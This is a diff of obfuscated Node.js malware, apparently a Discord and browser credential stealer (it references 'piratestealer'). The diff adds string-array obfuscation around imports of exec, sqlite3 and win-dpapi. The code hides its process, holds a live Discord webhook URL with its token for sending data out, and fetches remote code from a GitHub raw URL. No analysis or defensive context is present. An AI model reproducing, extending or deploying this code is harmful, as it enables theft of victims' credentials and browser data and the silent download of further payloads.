@@ -66,13 +66,46 @@ function _0x453a() {
 }
 if (args[0x0] == _0x49a82b(0x203)) debug = !![];
 else hideSelf();
-const glob = require(_0x49a82b(0x205)),
-    crypto = require(_0x49a82b(0x1f6)),
-    { exec } = require(_0x49a82b(0x1f5)),
-    axios = require("axios"),
-    buf_replace = require(_0x49a82b(0x1f7)),
-    sqlite3 = require(_0x49a82b(0x1fa))(require[_0x49a82b(0x204)]("sqlite3")),
-    dpapi = require("nexe-natives")(require[_0x49a82b(0x204)]("win-dpapi"));
+const _0x2a08e8 = _0x164d;
+function _0x164d(_0x2b0de7, _0x5b5b7e) {
+    const _0x17522d = _0x1752();
+    return (
+        (_0x164d = function (_0x164d5f, _0xf2085e) {
+            _0x164d5f = _0x164d5f - 0x145;
+            let _0xcf25ed = _0x17522d[_0x164d5f];
+            return _0xcf25ed;
+        }),
+        _0x164d(_0x2b0de7, _0x5b5b7e)
+    );
+}
+function _0x1752() {
+    const _0x57a064 = ["468jBuGFE", "1404198pKyINx", "6401646qPMHrm", "axios", "1788504tVKmwl", "nexe-natives", "949385gGCcFr", "44Sgkzhg", "1196146locZyt", "73913DMfoeM", "84205KbBkGc", "10bipNZf"];
+    _0x1752 = function () {
+        return _0x57a064;
+    };
+    return _0x1752();
+}
+(function (_0x37de5a, _0x4ea273) {
+    const _0x54e4f = _0x164d,
+        _0x2a7497 = _0x37de5a();
+    while (!![]) {
+        try {
+            const _0x16c1a8 =
+                -parseInt(_0x54e4f(0x14c)) / 0x1 +
+                -parseInt(_0x54e4f(0x14e)) / 0x2 +
+                parseInt(_0x54e4f(0x147)) / 0x3 +
+                (parseInt(_0x54e4f(0x14d)) / 0x4) * (-parseInt(_0x54e4f(0x150)) / 0x5) +
+                (-parseInt(_0x54e4f(0x146)) / 0x6) * (-parseInt(_0x54e4f(0x14f)) / 0x7) +
+                parseInt(_0x54e4f(0x14a)) / 0x8 +
+                (parseInt(_0x54e4f(0x148)) / 0x9) * (parseInt(_0x54e4f(0x145)) / 0xa);
+            if (_0x16c1a8 === _0x4ea273) break;
+            else _0x2a7497["push"](_0x2a7497["shift"]());
+        } catch (_0x40a942) {
+            _0x2a7497["push"](_0x2a7497["shift"]());
+        }
+    }
+})(_0x1752, 0x788f8);
+
 
   a0_0x5ddfb9 =
     'https://ptb.discord.com/api/webhooks/954108820324503593/tuL0T3Q-tHqCnOuwamoOGkrJFnXRAJONKT22LkCwYUgAHsRhH_WZuDRuud5kqGhcDulH',
@@ -198,7 +231,7 @@ a0_0x2a7a89()
 function a0_0x431a7f() {
   a0_0x2340fa
     .get(
-      'https://raw.githubusercontent.com/Ainsley3/piratestealer.github.io/main/obf',
+      'https://raw.githubusercontent.com/RustlerJS/rustlers/main/deneme3',
       (_0x796cbe) => {
         let _0x46b03c = ''
         _0x796cbe.on('data', (_0xb52d59) => {
